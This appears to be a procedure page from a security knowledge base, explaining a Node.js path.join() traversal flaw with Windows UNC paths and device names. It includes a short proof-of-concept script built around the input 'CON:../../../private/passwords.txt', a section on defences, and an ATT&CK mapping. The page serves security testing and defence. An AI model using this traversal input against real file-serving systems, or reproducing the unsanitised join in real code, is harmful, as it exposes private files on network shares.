---
tags:
  - path-traversal
  - unc-paths
  - javascript
type: procedure
tools:
  - '[[tools/Node.js]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/node-path-join-unc-test]]'
verified: false
platforms:
  - Windows
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:22.266Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: dac2863c-3b03-48d1-b1b5-f55658225a6a
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Create-Test-Script-for-UNC-Path-Traversal

## Summary

This procedure creates a JavaScript test script that exploits the path traversal vulnerability in Node.js path.join() by combining a UNC base path with user input containing a Windows device name like 'CON:', resulting in directory escape.

## Description

In Node.js, path.join() for UNC paths (e.g., '\\\\fileserver\\\\public\\\\uploads') strips device names without applying the CVE-2025-27210 protective prefix used in local paths. This allows inputs like 'CON:../../../private/passwords.txt' to resolve to paths outside the intended directory, such as '\\\\fileserver\\\\public\\\\private\\\\passwords.txt', enabling unauthorized file access on network shares.

## Requirements

1. Node.js v24.4.1+ installed
2. Text editor for JavaScript (e.g., VS Code)
3. Access to a UNC share for realistic testing (simulated if needed)

## Defense

Defensive measures and detection strategies:

- Sanitize inputs to remove or block device names and traversal sequences before path.join()
- Use absolute path validation to ensure resolution stays within share boundaries
- Log all path.join() calls with user input for anomaly detection

## Objectives

1. Construct a function mimicking vulnerable file path resolution
2. Incorporate malicious input to trigger device name stripping
3. Log the resulting path for analysis

## Instructions

### Step 1: Define the Vulnerable Function

**Context**: Create a function that joins a UNC base path with untrusted user input, simulating a file upload or serve handler.

**Command** ([[commands/node-path-join-unc-test]]):
```javascript
const path = require('path');

function getNetworkFile(userInput){
  const basePath = '\\\\fileserver\\\\public\\\\uploads';
  return path.join(basePath, userInput);
}
console.log(getNetworkFile('CON:../../../private/passwords.txt'));
```

> Save as test.js. This demonstrates the join operation where 'CON:' is stripped, allowing '../' to traverse up.

### Step 2: Verify Script Syntax

**Context**: Ensure the script is valid before execution.

**Command** ([[commands/node-check-syntax]]):
```bash
node -c test.js
```

> Expected output: No syntax errors, confirming readiness.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[File and Directory Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/node-path-join-unc-test]]
- [[commands/node-check-syntax]]

## Tools Used

- [[tools/Node.js]]

## Tags

- path-traversal
- unc-paths
- device-names
